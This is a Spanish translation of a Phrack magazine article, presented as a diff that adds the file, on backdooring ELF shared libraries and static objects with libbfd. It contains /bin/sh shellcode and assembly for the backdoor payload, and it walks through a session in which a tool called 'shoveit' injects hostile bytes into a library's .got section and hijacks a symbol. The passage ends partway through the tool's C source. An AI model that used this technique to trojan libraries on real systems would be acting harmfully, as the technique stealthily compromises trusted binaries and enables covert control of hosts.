@@ -1,0 +1,975 @@
+                      - P H R A C K   M A G A Z I N E -
+
+                            Volumen 0xa Numero 0x38
+                                  05.01.2000
+                                  0x09[0x10]
+
+|---------------------- BACKDOOREANDO OBJETOS BINARIOS ----------------------|
+|----------------------------------------------------------------------------|
+|-------------------------- klog <klog@promisc.org> -------------------------|
+
+
+----|  Introduccion
+
+Debilitar un sistema para tomar control sobre el (o simplemente para alterar
+algo de su funcionalidad) ha sido detallado en varios otros textos.  Desde
+la modificacion de codigo en userland hasta codigo troyano de kernel, la
+mayoria de las tecnicas comunes de backdooring son demasiado sucias, o
+no lo suficientemente portables.
+Como podemos crear una forma estandar y limpia de backdoorear archivos
+binarios? La respuesta correcta a esta pregunta es la misma que para
+"Como podemos crear un camino estandar y limpio para debuggear y analizar
+archivos binarios?".  El proyecto GNU encontro la respuesta incluso antes
+de que podamos hacer la pregunta.
+
+	ipdev:~$ ldd /usr/bin/nm
+        libbfd.so.2.6.0.14 => /usr/lib/libbfd.so.2.6.0.14
+        libc.so.5 => /lib/libc.so.5.3.12
+	ipdev:~$
+
+
+----|  El BFD.
+
+El Binary File Descriptor (Descriptor de Archivo Binario).  Convirtiendose
+en el estandar real en analisis de archivo binario, manipulacion y
+linkeo, libbfd soportara cualquier formato de archivo y arquitectura de
+la que puedas ser due~o.  Aunque esta mayormente orientado para soporte ELF,
+su frontend te permitira modificar objetos transparentemente con varios
+formatos como COFF, AOUT o IEEE.  En este momento, es probablemente tu mejor
+apuesta para backdooreo de shared librarys (librerias compartidas).
+
+
+----|  Vista general
+
+El siguiente articulo te mostrara la beatitud de la portabilidad backdoor
+describiendo ambos metodos de backdooring estaticos y objetos ELF
+compartidos.  Sera dividido en dos pasos logicos de la operacion que son
+el procedimiento de escritura del codigo, el procedimiento de insercion
+de codigo, y finalmente, el procedimiento de pirateo.
+
+
+NOTA RAPIDA:
+
+Antes de dividir, el lector necesita saber un par de cosas...  Ante todo,
+libbfd es *usualmente* encontrado en la mayoria de los sistemas, incluyendo
+linux, y *bsd.  Si no, esta incluido en la distribucion GNU binutils.
+Consiguela.  Tambien, es importante saber que libbfd depende de la libreria
+libiberty, que podras ser afortunado de encontrarla en el host objetivo.
+Es peque~a, y tendrias que considerar hacerla parte de tu toolkit portable
+de backdooring.
+Finalmente, podria pasar que BFD *no* provea las facilidades requeridas para
+insertar completamente nuestro codigo malicioso en situaciones especificas.
+De esta manera, podriamos tener que usar tecnicas especificas de formato
+de objetos para alcanzar nuestra meta.
+
+
+----|  Escribiendo el codigo hostil
+
+Esta seccion le sera familiar a la mayoria de ustedes escritores de
+shellcodes ahi afuera.  En realidad, es probablemente el paso mas doloroso
+en la portabilidad de nuestra tecnica de backdooreo.  Sin embargo, deberia
+ser razonablemente sin sufrimiento para el hacker aventajado que tiene algun
+conocimiento de ensamblamiento en arquitecturas comunes.
+
+El camino mas facil de escribir nuestro codigo podria ser hacerlo en asm,
+usando el metodo "eggcode", que nos permite insertar el codigo hostil en
+ambientes desconocidos sin ningun riesgo de romper sus links internos.
+Usando direccionamiento relativo, es posible escribir codigo que pueda ser
+completamente independiente de su entorno, como se ve en la mayoria de los
+shellcodes de exploits.  Un ejemplo de eggcode (para aquellos que nunca
+tocaron uno antes) puede ser el siguiente:
+
+	ipdev:~/tmp/bfd$ cat eggcode.s
+
+	.text
+	        .align 4
+	.globl main
+	        .type    main,@function
+	main:
+	        xorl %eax,%eax
+	        xorl %edx,%edx
+	        movb $0xb,%al
+	        jmp .jumpme
+	.callme:
+	        popl %ebx
+	        leal 0x8(%ebx),%ecx
+	        movl %ebx,0x8(%ebx)
+	        movl %edx,0xc(%ebx)
+	        int $0x80
+	.jumpme:
+	        call .callme
+		.string "/bin/sh\0"
+	
+	ipdev:~/tmp/bfd$ 
+	
+Sin embargo, cuando viene a backdoors, donde la redireccion de llamadas a
+funcion esta casi siempre (siempre?) involucrada, una tecnica se vuelve
+inaplicable.  En realidad, ese tipo de backdoor volveria inutil a la
+funcion pirateada, ya que no puede ser llevada a cabo redireccion alguna
+a la funcion original en condiciones especificas. Para ese proposito,
+tendremos que encontrar una forma para referirnos a funciones ubicadas en
+nuestro objeto objetivo.
+
+Afortunadamente para nosotros, hay un camino muy bonito para hacer eso.
+La unica condicion es que el simbolo referenciado debe estar ubicado dentro
+de la libreria que estamos backdooreando (no importado de cualquier otro
+lugar).  Vamos a suponer que queremos backdoorear una funcion llamada huhu()
+en alguna libreria, y que el backdoor tendra que redireccionar la llamada
+a otra funcion llamada haha() dentro de la misma libreria.  En este ejemplo,
+haha() sera pasado un string que sera impreso en pantalla.
+
+Antes de poder encontrar que direccion queremos llamar desde nuestro
+backdoor, tendremos que determinar la posicion de haha() dentro de la
+libreria objetivo...
+
+	ipdev:~/tmp/bfd$ nm lib.so
+	00001214 A _DYNAMIC
+	00001208 A _GLOBAL_OFFSET_TABLE_
+	00001264 A __bss_start
+	00001264 A _edata
+	00001264 A _end
+	00000200 A _etext
+	000001d8 t gcc2_compiled.
+	000001d8 T haha
+	000001ec T huhu
+	         U printf
+	ipdev:~/tmp/bfd$
+
+Podemos ver que mapeara en memoria en la direccion 0x1d8.  Para deducir que
+direccion queremos llamar en nuestro backdoor, tendremos que considerar
+la reubicacion del codigo que sera llevada a cabo cuando se este insertando
+nuestro backdoor dentro de la libreria.  La direccion resultante podria ser
+1d8-[reloc_offset].  Eso en mente, vamos a escribir el eggcode de nuestro
+backdoor:
+
+	ipdev:~/tmp/bfd$ cat > eggcode.s
+
+	.text
+	        .align 4
+	.globl main
+	        .type    main,@function
+	main:
+	        nop
+	        nop
+	        nop
+	        nop                  
+	        nop
+	        nop
+	        pushl %ebp
+	        movl %esp,%ebp
+	        jmp string
+	callit: call 0x1d8-0x1214-0x10
+	        addl $4,%esp
+	        movl %ebp,%esp
+	        popl %ebp
+	        ret
+	string:
+	        call callit
+	        .string "whore\n"
+	
+	^D
+	ipdev:~/tmp/bfd$
+
+En este ejemplo, el offset de reubicacion de nuestro codigo es 0x1214.
+La sustraccion de 0x10 es requerida porque la direccion llamada en el
+codigo es considerada por el compilador como relativa a la posicion de la
+instruccion de llamada, donde llamamos una direccion absoluta.  Como
+probablemente te habras preguntado, la instruccion de llamada termina en
+la direccion 0x10 dentro del eggcode.  Tambien, habras notado todos los nops
+al principio del codigo.  Esto es puramente para evitar cualquier relleno
+o problema de calculo.  Como en todo exploit que se esta escribiendo,
+nunca somos lo suficientemente cuidadosos.
+
+
+----|  Insertando el codigo hostil
+
+Ahora viene la parte donde libbfd se convertira en util.  En realidad,
+bfds tiene la capacidad de describir un archivo binario completo (desde la
+cabeza hasta la cola) mas o menos completamente con precision. Precision,
+en este caso, se refiere a la habilidad de interpretar varios datos del
+archivo objeto, que es altamente influenciado por la transparencia requerida
+por libbfd cuando viene a esa tarea.
+Asi, caracteristicas multiples especificas de formato seran sacrificadas
+para proteger la protabilidad de la interface bfd.  Sin embargo, no
+necesitamos preocuparnos sobre eso por el momento, ya que nuestra tarea
+consiste estrictamente en insercion de codigo malicioso.  Afortunadamente,
+nuestro metodo de insercion de troyano solo dependera de la presencia de
+multiples secciones dentro de un objeto, que es comun en la mayoria de las
+arquitecturas.  Antes de proceder a esto, tendremos que echar una mirada
+a que nos ofrecen las APIs libbfd.
+
+En el momento de escribir esto (bfd version < 3.0), libbfd no permite
+modificacion directa de un archivo objeto.  Las dos funciones mas utiles
+que libbfd nos ofrece son bfd_openr() y bfd_openw().  Ambas requieren
+el nombre del archivo objeto y el tipo de arquitectura como argumentos,
+y ambas devuelven un descriptor al bfd asignado.  Cuando un bfd esta
+siendo abierto en modo lectura (openr), ninguna de sus estructuras puede
+ser volcada dentro del archivo fisico.  Por otra parte, cuando es abierto
+en modo escritura (openw), ninguno de sus datos pueden ser leidos.  Por esta
+razon, para insertar nuestro backdoor, tendremos que copiar el archivo
+binario, seccion por seccion, y llevar a cabo la insercion de datos mientras
+copiamos la secion host de nuestro archivo objetivo.
+
+El proceso de copiar el archivo objeto esta compuesto de varios pasos,
+incluyendo la reproduccion de las direcciones de comienzo del archivo, flags,
+arquitectura, tabla de simbolo, informacion de debuggeado y varias secciones.
+Ya que un codigo de programa de backdooring llamado shoveit.c es apendizado
+al final de este articulo, solo echaremos una mirada a las funciones
+interesantes de libbfd cuando viene a insertar nuestro backdoor dentro del
+objeto destino (el pirateo de varias tablas de simbolos es descripto en
+las siguientes secciones).  Para propositos de informacion, vamos a echar
+una mirada a la vista transparente libbfd de una seccion de archivo binario:
+
+	typedef struct sec
+	{
+		const char *name;
+		int index;
+		struct sec *next;
+		flagword flags;
+	#define	SEC_NO_FLAGS        0x000
+	#define SEC_ALLOC           0x001
+	#define SEC_LOAD            0x002
+	#define SEC_RELOC           0x004
+	#define SEC_BALIGN          0x008
+	#define SEC_READONLY        0x010
+	#define SEC_CODE            0x020
+	#define SEC_DATA            0x040
+	       	unsigned int user_set_vma : 1;
+	       	unsigned int reloc_done : 1;
+	       	unsigned int linker_mark : 1;
+		bfd_vma vma;
+		bfd_vma lma;
+		bfd_size_type _cooked_size;
+		bfd_size_type _raw_size;
+		bfd_vma output_offset;
+		struct sec *output_section;
+		unsigned int alignment_power;
+		struct reloc_cache_entry *relocation;
+		struct reloc_cache_entry **orelocation;
+		unsigned reloc_count;
+		file_ptr filepos;
+		file_ptr rel_filepos;
+		file_ptr line_filepos;
+		PTR userdata;
+	   	unsigned char *contents;
+	   	alent *lineno; 
+	   	unsigned int lineno_count;
+	   	file_ptr moving_line_filepos;
+	   	int target_index;
+	   	PTR used_by_bfd;
+	   	struct relent_chain *constructor_chain;
+	   	bfd *owner;
+	   	struct symbol_cache_entry *symbol;
+	   	struct symbol_cache_entry **symbol_ptr_ptr;
+	   	struct bfd_link_order *link_order_head;
+	   	struct bfd_link_order *link_order_tail;
+	} asection ;
+
+
+Todas las secciones bfd representadas de un archivo binario son linkeadas
+juntas con el puntero *next, y apuntan de nuevo a su bfd padre con un puntero
+*owner. La mayoria de los otros campos son usados para procedimientos
+internos de libbfd, o por macros frontend.  Son muy auto-explicativos;
+sin embargo, para mas informacion sobre para que esta hecho un campo dado,
+referirse a la cabecera de archivo bfd.h.
+
+Para copiar secciones desde un bfd a otro, primero deberas registrar un
+handler con la funcion bfd_map_over_sections(), que sera ejecutada para
+cada seccion del bfd input.  Esta funcion de mapeo debe ser pasada al bfd
+o archivo en cuestion, y un puntero a la funcion manejadora.  Un puntero
+"obj" opcional puede tambien ser pasado a esta funcion manejadora, que debe
+tener el siguiente prototipo:
+
+	handler(bfd *, asection *, void *);
+
+Para crear primero las secciones de destino que corresponderan a las
+secciones de nuestro objeto fuente, registraremos una funcion setup_seccion()
+que configurara cada seccion destino con su respectivo vma, lma, tama~o,
+alineamiento y flags.  Como puedes ver en codigo de abajo, debemos prestar
+particular atencion para mantener suficiente espacio libre en la seccion
+que alojara nuestro codigo hostil para que nuestro backdoor y la seccion
+original; ambos quepan confortablemente.
+Tambien, una vez que el backdoor ha sido ubicado dentro de una seccion,
+todo lo de las siguientes secciones de vma y lma son reajustados para que
+nuestro codigo hostil no sea sobreescrito por esas secciones una vez
+mapeado en memoria virtual.
+
+Una vez que es hecha la creacion de nuestras secciones destino, tendremos que
+copiar la tabla de simbolo de nuestro archivo fuente, que debe ser hecho
+antes de que cualquier contenido de seccion se reproduzca.  Como fue dicho
+antes, esto sera examinado en las siguientes secciones.
+
+Finalmente, estamos listos para copiar los datos de una seccion a su
+respectivo destino (que es llevado a cabo por el handler copy_section()
+en el codigo de abajo).  Los datos pueden ser leidos de y escritos a
+una seccion bfd usando bfd_get_section_contents y bfd_set_section_contents
+respectivamente.  Ambas de estas funciones requieren los siguientes
+argumentos:
+
+        - el bfd objetivo/fuente,
+        - punteros de seccion,
+        - un puntero al buffer (que sera llenado con/volcado a la seccion
+          apuntada),
+        - el offset dentro de la secion,
+        - el tama~o del buffer.
+
+Los datos seran volcados fisicamente dentro del archivo objeto una vez
+que ha sido llamada la funcion bfd_close().
+
+En una situacion usual donde una seccion es modificada mientras esta siendo
+copiada, podemos tener que reubicar todas las referencias absolutas a
+simbolos ubicadas en las secciones siguientes a la seccion alterada.
+Sin embargo, esta operacion puede ser evitada si la seccion host es de entre
+las ultimas en ser mapeadas en memoria virtual, despues de lo cual ninguna
+otra seccion es referenciada con direccionamiento absoluto.  Si echamos
+un rapido vistazo al siguiente ejemplo:
+
+	ipdev:~/tmp/bfd$ objdump -h /usr/lib/crt1.o
+
+	/usr/lib/crt1.o:     file format elf32-i386
+
+	Sections:
+	Idx Name          Size      VMA       LMA       File off  Algn
+	  0 .text         00000080  00000000  00000000  00000040  2**4
+	                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE
+	  1 .data         00000004  00000000  00000000  000000c0  2**2
+	                  CONTENTS, ALLOC, LOAD, DATA
+	  2 .bss          00000000  00000000  00000000  000000c4  2**2
+	                  ALLOC
+	ipdev:~/tmp/bfd$
+
+Podemos probablemente considerar ubicar nuestro codigo dentro de la seccion
+de datos de nuestra cabecera de programa crt1.o.  Sin embargo, la situacion
+puede convertirse en completamente diferente para shared libraries:
+
+	ipdev:~/tmp/bfd$ objdump -h lib.so
+        
+        lib.so:     file format elf32-i386
+
+        Sections:
+        Idx Name          Size      VMA       LMA       File off  Algn
+          0 .hash         0000003c  00000094  00000094  00000094  2**2
+                          CONTENTS, ALLOC, LOAD, READONLY, DATA
+          1 .dynsym       000000a0  000000d0  000000d0  000000d0  2**2
+                          CONTENTS, ALLOC, LOAD, READONLY, DATA
+          2 .dynstr       00000050  00000170  00000170  00000170  2**0
+                          CONTENTS, ALLOC, LOAD, READONLY, DATA
+          3 .rel.text     00000018  000001c0  000001c0  000001c0  2**2
+                          CONTENTS, ALLOC, LOAD, READONLY, DATA
+          4 .text         00000028  000001d8  000001d8  000001d8  2**2
+                          CONTENTS, ALLOC, LOAD, READONLY, CODE
+          5 .rodata       00000006  00000200  00000200  00000200  2**0
+                          CONTENTS, ALLOC, LOAD, READONLY, DATA
+          6 .data         00000000  00001208  00001208  00000208  2**2
+                          CONTENTS, ALLOC, LOAD, DATA
+          7 .got          0000000c  00001208  00001208  00000208  2**2
+                          CONTENTS, ALLOC, LOAD, DATA
+          8 .dynamic      00000050  00001214  00001214  00000214  2**2
+                          CONTENTS, ALLOC, LOAD, DATA
+          9 .bss          00000000  00001264  00001264  00000264  2**2
+                          ALLOC
+         10 .note         00000014  00000000  00000000  00000264  2**0
+                          CONTENTS, READONLY
+         11 .comment      00000012  00000000  00000000  00000278  2**0
+                          CONTENTS, READONLY
+        ipdev:~/tmp/bfd$
+
+En este caso, nuestro mejor intento probablemente seria la tabla de offset
+global (got) de la libreria, ya que no queremos romper links absolutos en
+las secciones precedentes.  Cuando sea posible, trataremos de no alterar
+secciones especiales como dynsym, dynstr o dynamic, que son casi siempre
+analizadas por herramientas como nm u objdump.
+
+
+----|  Pirateo de simbolos estandar
+
+La alteracion de simbolos estandar es probablemente la parte mas importante
+del procedimiento de backdooreo.  En realidad, una vez que nuestro codigo
+es escrito y pusheado dentro del objeto objetivo, debemos encontrar una
+manera para disparar su ejecucion cuando sea que la funcion que queremos
+backdoorear sea llamada por un proceso confiable.
+
+El primer tipo de pirateo de simbolo es completamente interesante cuando
+tratamos de backdoorear objetos estaticos.  La tabla de simbolos estandar
+de un archivo binario es facilmente accesible via la interface bfd, y
+por lo tanto, esta operacion no sera ambos, simple y portable.  Cada uno
+de los simbolos es representado canonicamente por libbfd como esto:
+
+	typedef struct symbol_cache_entry
+	{
+	  	struct _bfd *the_bfd;
+	  	const char *name;
+	  	symvalue value;
+		flagword flags;
+	#define BSF_NO_FLAGS            0x00
+	#define BSF_LOCAL               0x01
+	#define BSF_GLOBAL              0x02
+	#define BSF_EXPORT              BSF_GLOBAL  
+	#define BSF_DEBUGGING           0x08
+	#define BSF_FUNCTION            0x10
+	#define BSF_KEEP                0x20
+	#define BSF_KEEP_G              0x40
+	#define BSF_WEAK                0x80
+	#define BSF_SECTION_SYM         0x100
+	#define BSF_OLD_COMMON          0x200
+	#define BFD_FORT_COMM_DEFAULT_VALUE 0
+	#define BSF_NOT_AT_END          0x400
+	#define BSF_CONSTRUCTOR         0x800
+	#define BSF_WARNING             0x1000
+	#define BSF_INDIRECT            0x2000
+	#define BSF_FILE                0x4000
+	#define BSF_DYNAMIC             0x8000
+	#define BSF_OBJECT              0x10000
+	  	struct sec *section;
+	  	union
+	    	{
+	      		ptr p;
+	      		bfd_vma i;
+	    	} udata;
+	} asymbol;
+
+A diferencia de las secciones, las entradas de simbolo son ubicadas usando
+un array de punteros, pero tambien ellos apuntan de regreso a ambos de sus
+bfd padres (usando *the_bfd) y su seccion padre (usando *section).  Los
+simbolos en los que estaremos interesados en piratear tendran la flag
+BSF_FUNCTION.  El nombre y valor relativo del simbolo son apuntados y
+guardados en los campos de nombre y valor, respectivamente (como te puedes
+haber preguntado).  Usaremos ambos para ubicar nuestro simbolo objetivo.
+
+Para leer la tabla de simbolo de un archivo objeto, primero tendremos que
+obtener su tama~o usando bfd_get_symtab_upper_bound() (cuyo unico argumento
+es el bfd de nuestro objeto objetivo).  Una vez que esto es hecho, podremos
+hacer malloc a un buffer y llenarlo con la tabla de simbolo del objeto
+usando bfd_canonicalize_symtab().  Esta funcion bfd recibira el bfd del
+objeto seguido del buffer malloceado como argumentos, y devuelve el numero
+de simbolos canonicalizados.
+
+Cuando se esta procesando la tabla para piratear nuestro simbolo especifico
+(que buscaremos por valor en vez de por nombre, para razones veremos en la
+siguiente seccion), tendremos que considerar el hecho de que cada valor de
+simbolo ha sido modificado por libbfd para verse relativo al respectivo
+comienzo de la seccion.  Por esta razon, el primer simbolo de una seccion
+random (al azar) se vera siempre como teniendo el valor de 0x0, aunque es
+completamente diferente fisicamente.
+
+Una vez que la tabla de simbolo ha sido alterada como debia, es posible
+volcarla de regreso en su archivo objeto usando la funcion bfd_set_symtab(),
+que requiere el bfd del objeto como argumento, el puntero a la tabla de
+simbolo (el buffer malloceado) y el numero de simbolos a ser escrito.
+
+
+----|  Pirateo de simbolo dinamico
+
+Cuando viene el piratear objetos compartidos el proceso pirateador se
+convierte en completamente diferente.  Ante todo, los objetos compartidos
+usan una tabla de simbolo diferente que la usada para linkeado estatico.
+Bajo ELF, estos simbolos son guardados en la seccion ".dynsym", pero
+permanecen representados en la misma forma que esta un simbolo estatico.
+Tambien, todos los nombres de los simbolos guardados en la seccion ".dynsym"
+del objeto son mantenidos en una seccion diferente, llamada ".dynstr".
+
+Sin embargo, esto esta lejos de ser la parte mas problematica.  Aunque tu
+podras usar libbfd para leer simbolos dinamicos de la misma manera que lees
+simbolos estandar, no parece ser ninguna tabla de simbolo dinamico volcando
+la funcion implementada en libbfd todavia.  En otras palabras, significa
+que nuestra tecnica combo insercion/pirateo maravillosamente portable
+perdera mucho de su portabilidad en esta operacion.  Sin embargo, ya que
+el linkeado dinamico es casi solo (en los casos mas interesantes) usado en
+ELF, el sacrificio no es muy caro.
+
+Ahora que sabemos tendremos que modificar manualmente la tabla de simbolo,
+tenemos un dilema practico peque~o.  Ya que la tabla de simbolo dinamico
+es ubicada dentro de una seccion de nuestro objeto objetivo, probablemente
+querramos llevar a cabo el pirateo de simbolo dinamico mientras se copia
+cada una de las secciones del archivo.  El dilema es este, como dije antes,
+los nombres de simbolo son guardados en una seccion diferente del archivo.
+Dos posibilidades nos son ofrecidas.  La primera es cargar ambas tablas
+en memoria y los strings de la seccion .dynstr.  Sin embargo, ya que somos
+perezosos, probablemente preferramos una solucion alternativa, donde
+ubicaremos cada simbolo por su valor original en vez de por su nombre
+(como fue notado en la seccion previa).
+
+Ahora que estamos listos para procesar la tabla de simbolo dinamico
+manualmente, esto puede requerir saber como se ve una entrada de simbolo ELF:
+
+	typedef struct elf32_sym {
+  		Elf32_Word    st_name;
+  		Elf32_Addr    st_value;
+  		Elf32_Word    st_size;
+  		unsigned char st_info;
+  		unsigned char st_other;
+  		Elf32_Half    st_shndx;
+	} Elf32_Sym;
+
+Como en la estructura bfd de simbolo transparente, la mayoria de los campos
+en los que estamos interesados son completamente auto-explicativos.  Si ahora
+echamos un vistazo a como se ve la seccion .dynsym, veremos esto:
+
+	ipdev:~/tmp/bfd$ objdump --full-contents --section=.dynsym lib.so
+
+	lib.so:     file format elf32-i386
+
+	Contents of section .dynsym:
+	 00d0 00000000 00000000 00000000 00000000  ................
+	 00e0 01000000 14120000 00000000 1100f1ff  ................
+	 00f0 0a000000 08120000 00000000 1100f1ff  ................
+	 0100 20000000 d8010000 13000000 12000500   ...............
+	 0110 25000000 00000000 00000000 10000000  %...............
+	 0120 2c000000 ec010000 14000000 12000500  ,...............
+	 0130 31000000 00020000 00000000 1100f1ff  1...............
+	 0140 38000000 64120000 00000000 1100f1ff  8...d...........
+	 0150 3f000000 64120000 00000000 1100f1ff  ?...d...........
+	 0160 4b000000 64120000 00000000 1100f1ff  K...d...........
+	ipdev:~/tmp/bfd$
+
+Puedes observar que la primera entrada de la tabla de simbolo dinamico
+(la segunda siendo usada por el simbolo de seccion _DYNAMIC que tiene
+un valor de 0x1214) es nullificada.  Para nuestros ojos, es solo otra
+caracteristica mistica establecida por el estandar ELF, que no es tomada
+en consideracion como peor para nuestra operacion de pirateo.
+
+
+----|  SHOVEIT: una herramienta de insercion de codigo multiproposito
+
+Para simplificar la tarea de backdoorear librerias compartidas y objetos
+estaticos, escribi una linda y peque~a herramienta que te permitira usar
+algunas APIs bfd sin tener que preocuparte sobre programacion.  Por supuesto,
+esto puede abrir la puerta a los script kiddies, pero pudiendo ir a traves
+de todo este articulo antes de usarlo, y dudo que la mayoria de ellos pueda
+hacerlo.  La herramienta esta ubicada al final del articulo, extraible
+usando la Utilidad de Extraccion de Phrack Magazine.
+
+Echemos un vistazo a un ejemplo practico de insercion de codigo usando
+shoveit.  Supongamos aqui que estamos backdooreando la misma libreria
+compartida lib.so como estabamos tratando de backdoorear al principio de
+este articulo.  Sus simbolos mas interesantes siguen siendo la funcion haha
+(la que llamamos) en la direccion 0x1d8 y la funcion huhu (la que pirateamos)
+en la direccion 0x1ec.  Tambien estamos usando el backdoor que escribimos
+previamente, "eggcode.s".
+
+	ipdev:~/tmp/bfd$ gcc -c test.s
+	ipdev:~/tmp/bfd$ objdump -h test.o
+	
+	test.o:     file format elf32-i386
+	
+	Sections:
+	Idx Name          Size      VMA       LMA       File off  Algn
+	  0 .text         00000023  00000000  00000000  00000034  2**2
+	                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+	  1 .data         00000000  00000000  00000000  00000058  2**2
+	                  CONTENTS, ALLOC, LOAD, DATA
+	  2 .bss          00000000  00000000  00000000  00000058  2**2
+	                  ALLOC
+	ipdev:~/tmp/bfd$
+	
+Ahora vemos que todo nuestro codigo del backdoor es guardado en la seccion
+text del eggcode.  Antes de pushearlo dentro de nuestra libreria objetivo,
+tendremos que verificar donde sera ubicado despues de la insercion, por
+lo que podemos piratear la tabla de simbolo de la libreria correctamente.
+
+	ipdev:~/tmp/bfd$ objdump -h lib.so
+	
+	lib.so:     file format elf32-i386
+	
+	Sections:
+	Idx Name          Size      VMA       LMA       File off  Algn
+	  0 .hash         0000003c  00000094  00000094  00000094  2**2
+	                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+	  1 .dynsym       000000a0  000000d0  000000d0  000000d0  2**2
+	                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+	  2 .dynstr       00000050  00000170  00000170  00000170  2**0
+	                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+	  3 .rel.text     00000018  000001c0  000001c0  000001c0  2**2
+	                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+	  4 .text         00000028  000001d8  000001d8  000001d8  2**2
+	                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+	  5 .rodata       00000006  00000200  00000200  00000200  2**0
+	                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+	  6 .data         00000000  00001208  00001208  00000208  2**2
+	                  CONTENTS, ALLOC, LOAD, DATA
+	  7 .got          0000000c  00001208  00001208  00000208  2**2
+	                  CONTENTS, ALLOC, LOAD, DATA	
+	  8 .dynamic      00000050  00001214  00001214  00000214  2**2
+	                  CONTENTS, ALLOC, LOAD, DATA
+	  9 .bss          00000000  00001264  00001264  00000264  2**2
+	                  ALLOC
+	 10 .note         00000014  00000000  00000000  00000264  2**0
+	                  CONTENTS, READONLY
+	 11 .comment      00000012  00000000  00000000  00000278  2**0
+	                  CONTENTS, READONLY
+	ipdev:~/tmp/bfd$ nm --dynamic lib.so
+	00001214 A _DYNAMIC
+	00001208 A _GLOBAL_OFFSET_TABLE_
+	00001264 A __bss_start
+	00001264 A _edata
+	00001264 A _end
+	00000200 A _etext
+	000001d8 T haha
+	000001ec T huhu
+	         U printf
+	ipdev:~/tmp/bfd$
+
+Genial.  Observamos que si insertamos nuestro codigo hostil justo despues
+del contenido de la tabla del offset global, tendremos que alterar el valor
+de huhu desde 0x1ec a 0x1214 (0x1208+0xc).  Ahora usaremos shoveit para
+apendizar nuestro codigo de backdoor a nuestra seccion .got de la libreria,
+y para piratear el simbolo "huhu" entonces apunta a la posicion en la cual
+nuestro backdoor fue insertado.
+
+	ipdev:~/tmp/bfd$ ./shoveit test.o .text lib.so .got 0x1ec 0x1214
+	Hooking statsyms from 0x1ec to 0x1214
+	Hooking dynsyms from 0x1ec to 0x1214
+	Inserting 35 hostile bytes into .got
+	ipdev:~/tmp/bfd$ nm --dynamic lib.so
+	00001214 A _DYNAMIC
+	00001208 A _GLOBAL_OFFSET_TABLE_
+	00001264 A __bss_start
+	00001264 A _edata
+	00001264 A _end
+	00000200 A _etext	
+	000001d8 T haha
+	00001214 T huhu
+	         U printf
+	ipdev:~/tmp/bfd$ objdump -D --section=.got \
+			 --start-address=0x1214 lib.so
+	
+	lib.so:     file format elf32-i386
+	
+	Disassembly of section .got:
+	00001214 <.got+c> nop
+	00001215 <.got+d> nop
+	00001216 <.got+e> nop
+	00001217 <.got+f> nop
+	00001218 <.got+10> nop
+	00001219 <.got+11> nop
+	0000121a <.got+12> pushl  %ebp
+	0000121b <.got+13> movl   %esp,%ebp
+	0000121d <.got+15> jmp    0000122b <_DYNAMIC+17>
+	0000121f <.got+17> call   000001d8 <haha>
+	00001224 <.got+1c> addl   $0x4,%esp
+	00001227 <.got+1f> movl   %ebp,%esp
+	00001229 <.got+21> popl   %ebp
+	0000122a <.got+22> ret
+	0000122b <.got+23> call   0000121f <_DYNAMIC+b>
+	00001230 <.got+28> ja     0000129a <__bss_start+36>
+	00001232 <.got+2a> outsl  %ds:(%esi),(%dx)
+	00001233 <.got+2b> jb     0000129a <__bss_start+36>
+	00001235 <.got+2d> orb    (%eax),%al
+	ipdev:~/tmp/bfd$
+	
+Maravilloso.  Hemos insertado nuestro codigo hostil en vma 0x1214 en la
+libreria y pirateado el simbolo huhu para hacerlo apuntar a ella.  Ademas,
+puedes observar que nuestros calculos desde la primera parte del articulo
+fueron correctos: nuestro codigo llama exitosamente a la funcion haha()
+dentro de la libreria objetivo.
+Nada puede detenernos de ahora en adelante...
+
+	ipdev:~/tmp/bfd$ ldd prog
+	        ./lib.so => ./lib.so
+	ipdev:~/tmp/bfd$ ./prog
+	whore
+	ipdev:~/tmp/bfd$
+
+
+----|  The END (sniff)
+
+Espero que todos hayan disfrutado esta peque~a demostracion.  Por supuesto,
+esto no es una nueva clase de vulnerabilidad, sin embargo, espero que
+ayude a alguna gente a entender que una vez que su host ha perdido su
+integridad, siempre deberia asumir lo peor.  La certeza de que el codigo
+fuente de un sistema es preservado fuertemente de ojos entrometidos no es
+un argumento valido cuando viene a seguridad.  De una forma u otra, los
+estandares que sigues haran a tu software tan potencialmente vulnerable
+como cualquier otro software.
+
+Gracias a adm, promisc, wiretrip, teso, w00w00, y por supuesto, phrack.
+
+
+----|  Shoveit
+
+<++> p56/bfd/shoveit.c !6de17d5d
+/*
+ *
+ *      Codeado por klog <klog@promisc.org>
+ *
+ *      libbfd depende de libiberty, entonces
+ *	cc -c shoveit.c first, then cc shoveit.o -lbfd -liberty
+ *
+ *	shoveit <src_obj> <src_segment> <dst_obj> <dst_segment>
+ * 		<orig_addr> <new_addr>
+ *
+ *      Esta herramienta insertara "src_segment" desde "src_obj" dentro de
+ *      "dst_segment" de "dst_obj", y altera "symbol" al valor 
+ *      fisico "value".
+ *
+ *      Portable, sigiloso, flexible.
+ *      Diviertete :)
+ *
+ *      NB: shoveit *no* hace reubicacion
+ *
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <bfd.h>
+#include <strings.h>
+#include <linux/elf.h>
+
+#define DYNSTAB ".dynsym"
+
+#define nonfatal(s) {perror(s); return;}
+#define fatal(s) {perror(s); exit(-1);}
+#define bfd_nonfatal(s) {bfd_perror(s); return;}
+#define bfd_fatal(s) {bfd_perror(s); exit(-1);}
+
+char *input_section;
+char *output_section;
+char *input_filename;
+
+static bfd *bd_bfd;
+static sec_ptr bdsection;
+static int bd_size = 0;
+static int isdone = 0;
+static int vma_offset = 0;
+
+static long hooksym;
+static long hookval;
+
+void hook_dynstab(struct elf32_sym *symtab, bfd_size_type size)
+{
+	int symcount, i;
+
+ 	symcount = size/sizeof(asymbol);
+	for(i=0;i<symcount;i++) {
+		if (symtab[i].st_value == hooksym) 
+			symtab[i].st_value = hookval;
+	}
+}
+
+void setup_section(bfd *ibfd, sec_ptr isection, bfd *obfd)
+{
+  	struct section_list *p;
+  	sec_ptr osection;
+  	bfd_vma vma;
+  	bfd_vma lma;
+  	flagword flags;
+  	char *err;
+	int isdest = 0;
+
+	if (!strcmp(output_section, isection->name)) isdest = 1;	
+
+  	osection = bfd_make_section_anyway(obfd, 
